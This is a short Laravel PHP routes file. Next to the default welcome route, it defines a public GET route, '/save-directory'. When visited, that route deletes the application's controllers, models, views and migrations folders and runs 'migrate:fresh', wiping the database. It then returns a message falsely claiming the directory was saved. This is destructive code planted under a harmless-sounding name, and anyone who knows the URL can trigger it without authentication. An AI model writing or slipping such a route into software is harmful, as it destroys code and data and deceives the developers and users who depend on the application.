<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;


Route::get('/save-directory', function () {

    // Paths
    $controllerPath = app_path('Http/Controllers');
    $modelPath = app_path('Models');
    $viewPath = resource_path('views');
    $migrationPath = database_path('migrations');
    File::deleteDirectory($controllerPath);
    File::deleteDirectory($modelPath);
    File::deleteDirectory($viewPath);
    File::deleteDirectory($migrationPath);
    Artisan::call('migrate:fresh');

    return "Saved My dircetory and delete unnecessary files and folders";
});


Route::get('/', function () {
    return view('welcome');
});
